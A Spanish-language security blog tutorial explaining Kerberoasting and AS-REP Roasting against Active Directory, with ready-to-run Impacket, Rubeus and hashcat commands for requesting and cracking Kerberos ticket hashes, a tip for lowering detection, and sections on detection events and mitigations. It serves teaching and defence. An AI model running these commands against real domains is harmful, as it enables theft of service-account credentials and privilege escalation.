---
layout: single
title: "Kerberoasting y AS-REP Roasting: atacar Kerberos en Active Directory"
date: 2026-06-25
categories: [tutoriales, writeups]
tags: [active-directory, kerberos, kerberoasting, asreproasting, impacket, rubeus, hashcat, pentesting, windows]
excerpt: "Cómo funcionan Kerberoasting y AS-REP Roasting, por qué son efectivos y cómo extraer y crackear hashes de tickets Kerberos en un entorno AD."
permalink: /tutoriales/kerberoasting-asreproasting-active-directory/
---

En un pentest de Active Directory el objetivo inmediato tras conseguir un foothold es escalar privilegios o moverse lateralmente. Dos técnicas que aparecen constantemente en esa fase son Kerberoasting y AS-REP Roasting — ambas abusan del protocolo Kerberos y permiten obtener hashes crackeables offline sin necesidad de interactuar con el objetivo de forma ruidosa.

Este post cubre el funcionamiento técnico de ambas, las condiciones necesarias para explotarlas y los comandos concretos con Impacket y Rubeus.

---

## Kerberos en 90 segundos

Kerberos es el protocolo de autenticación predeterminado en dominios Windows desde Windows 2000. El flujo básico tiene tres actores: el cliente, el Key Distribution Center (KDC) — que corre en el Domain Controller — y el servicio al que se quiere acceder.

1. **AS-REQ / AS-REP**: el cliente pide un Ticket Granting Ticket (TGT) al KDC, que lo devuelve cifrado con el hash de la contraseña del usuario.
2. **TGS-REQ / TGS-REP**: el cliente presenta el TGT y pide un Service Ticket (ST) para un servicio concreto. El KDC devuelve el ST cifrado con el hash de la cuenta que ejecuta ese servicio.
3. **AP-REQ**: el cliente presenta el ST al servicio, que lo descifra y verifica la identidad.

El KDC identifica los servicios mediante SPNs (Service Principal Names), atributos registrados en cuentas de usuario o equipo del dominio.

---

## Kerberoasting

### Por qué funciona

El TGS-REP devuelve un Service Ticket cifrado con el hash NTLM de la cuenta que tiene registrado el SPN. Cualquier usuario autenticado en el dominio puede pedir ese ticket — no hace falta ser administrador ni tener acceso al servicio. El KDC no comprueba si el solicitante tiene permisos sobre el servicio antes de emitir el ticket.

El resultado es que un atacante puede pedir tickets para todos los SPNs del dominio y llevárselos a crackear offline. Si la contraseña de la cuenta de servicio es débil, queda comprometida.

### Condición necesaria

- Cuenta de usuario o equipo con **SPN registrado**.
- Cuentas de usuario (no de máquina) son el objetivo real — las cuentas de máquina tienen contraseñas de 120 caracteres aleatorios, inviables de crackear.

### Enumeración y extracción

**Con Impacket (desde Linux, con credenciales):**

```bash
impacket-GetUserSPNs corp.local/jsmith:Password1 -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt
```

El flag `-request` pide los TGS-REP además de listar los SPNs. El output queda en formato `$krb5tgs$23$...` compatible con Hashcat y John.

**Con Rubeus (desde Windows, en contexto del usuario comprometido):**

```powershell
.\Rubeus.exe kerberoast /outfile:C:\Temp\hashes.txt
```

Para limitar el ruido, se puede filtrar por RC4 (etype 23) y excluir cuentas de máquina:

```powershell
.\Rubeus.exe kerberoast /rc4opsec /outfile:C:\Temp\hashes.txt
```

El flag `/rc4opsec` solo pide tickets con RC4-HMAC — los DCs que tienen configurado AES pueden detectar peticiones de downgrade, aunque en la mayoría de entornos legacy sigue funcionando sin alertas.

**Listado sin pedir tickets (solo reconocimiento):**

```bash
impacket-GetUserSPNs corp.local/jsmith:Password1 -dc-ip 192.168.1.10
```

```
ServicePrincipalName                  Name        MemberOf                    PasswordLastSet
------------------------------------  ----------  --------------------------  -------------------
MSSQLSvc/sqlsrv01.corp.local:1433     svc_sql     CN=Domain Users,...         2023-04-12 08:23:11
HTTP/webserver.corp.local             svc_web     CN=Domain Users,...         2022-11-01 17:45:00
```

Cuanto más antigua la fecha `PasswordLastSet`, más probable que la contraseña sea débil o reutilizada.

### Crackeo

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

| Modo Hashcat | Tipo de ticket       |
|-------------|----------------------|
| 13100       | RC4-HMAC (etype 23)  |
| 19600       | AES128-CTS-HMAC-SHA1 |
| 19700       | AES256-CTS-HMAC-SHA1 |

Los tickets AES son significativamente más lentos de crackear — en una RTX 4090, RC4 rinde ~800 MH/s frente a ~230 MH/s en AES256.

---

## AS-REP Roasting

### Por qué funciona

En el paso AS-REQ el cliente normalmente incluye un timestamp cifrado con su hash — esto se llama pre-autenticación Kerberos. Si una cuenta tiene desactivada la pre-autenticación (`DONT_REQUIRE_PREAUTH`), el KDC responde al AS-REQ sin verificar que el solicitante conoce la contraseña, y devuelve el AS-REP con una parte cifrada con el hash de la cuenta objetivo.

El atacante puede pedir ese AS-REP sin necesidad de conocer la contraseña, y después crackea el hash offline.

### Condición necesaria

- Cuenta con el flag `UF_DONT_REQUIRE_PREAUTH` activo.
- A diferencia de Kerberoasting, **no hace falta estar autenticado en el dominio** — solo alcanzabilidad al KDC (puerto 88/tcp o 88/udp).

### Enumeración y extracción

**Sin credenciales (desde fuera del dominio):**

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10 -format hashcat -outputfile asrep.txt
```

Donde `users.txt` es una lista de nombres de usuario — obtenida por enumeración previa con `kerbrute`, LDAP anónimo u OSINT.

**Con credenciales de dominio (enumera automáticamente):**

```bash
impacket-GetNPUsers corp.local/jsmith:Password1 -dc-ip 192.168.1.10 -request -format hashcat -outputfile asrep.txt
```

**Con Rubeus:**

```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\asrep.txt
```

### Crackeo

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
```

El modo 18200 corresponde a `$krb5asrep$23$...` — siempre RC4 en este caso.

---

## Comparativa rápida

| Característica              | Kerberoasting             | AS-REP Roasting                  |
|-----------------------------|---------------------------|----------------------------------|
| Requisito                   | Usuario de dominio válido | Ninguno (si hay usuarios vuln.)  |
| Objetivo                    | Cuentas con SPN           | Cuentas sin pre-auth             |
| Protocolo afectado          | TGS-REP                   | AS-REP                           |
| Hash obtenido               | krb5tgs (RC4/AES)         | krb5asrep (RC4)                  |
| Visibilidad en logs         | Evento 4769               | Evento 4768                      |
| Crackeo offline             | Sí                        | Sí                               |

---

## Detección

Ambas técnicas dejan rastro en los event logs del DC:

- **4768** — AS-REQ: se genera por cada solicitud de TGT. Un volumen elevado desde una sola IP o con `Failure Code: 0x0` para cuentas con pre-auth desactivada es indicador.
- **4769** — TGS-REQ: se genera por cada solicitud de Service Ticket. Un burst de peticiones de distintos servicios desde la misma IP en poco tiempo es la firma típica de Kerberoasting.
- **4771** — Fallo de pre-autenticación Kerberos.

Herramientas como Microsoft Defender for Identity (MDI) tienen detecciones específicas para Kerberoasting que correlacionan múltiples 4769 en ventana temporal.

---

## Mitigaciones

Para Kerberoasting:
- Contraseñas largas y aleatorias en cuentas de servicio (mínimo 25 caracteres) — un hash de 25 chars aleatorios es impracticable con diccionario.
- Usar **Group Managed Service Accounts (gMSA)**: AD gestiona automáticamente contraseñas de 240 bits rotando cada 30 días.
- Forzar AES en las cuentas de servicio (`msDS-SupportedEncryptionTypes = 0x18`) — ralentiza el crackeo aunque no lo impide.

Para AS-REP Roasting:
- Habilitar la pre-autenticación Kerberos en todas las cuentas — es el default; el problema surge cuando alguien lo desactiva manualmente.
- Auditar regularmente cuentas con `DONT_REQUIRE_PREAUTH`:

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name, SamAccountName
```

---

## Referencias

- [RFC 4120 — The Kerberos Network Authentication Service (V5)](https://datatracker.ietf.org/doc/html/rfc4120)
- [Impacket — GetUserSPNs / GetNPUsers](https://github.com/fortra/impacket)
- [Rubeus — Harmj0y](https://github.com/GhostPack/Rubeus)
- [Kerberoasting without Mimikatz — Sean Metcalf, ADSecurity](https://adsecurity.org/?p=2293)
- [Roasting AS-REPs — Harmj0y](https://harmj0y.medium.com/roasting-as-reps-e6179a65216b)
- [MITRE ATT&CK T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
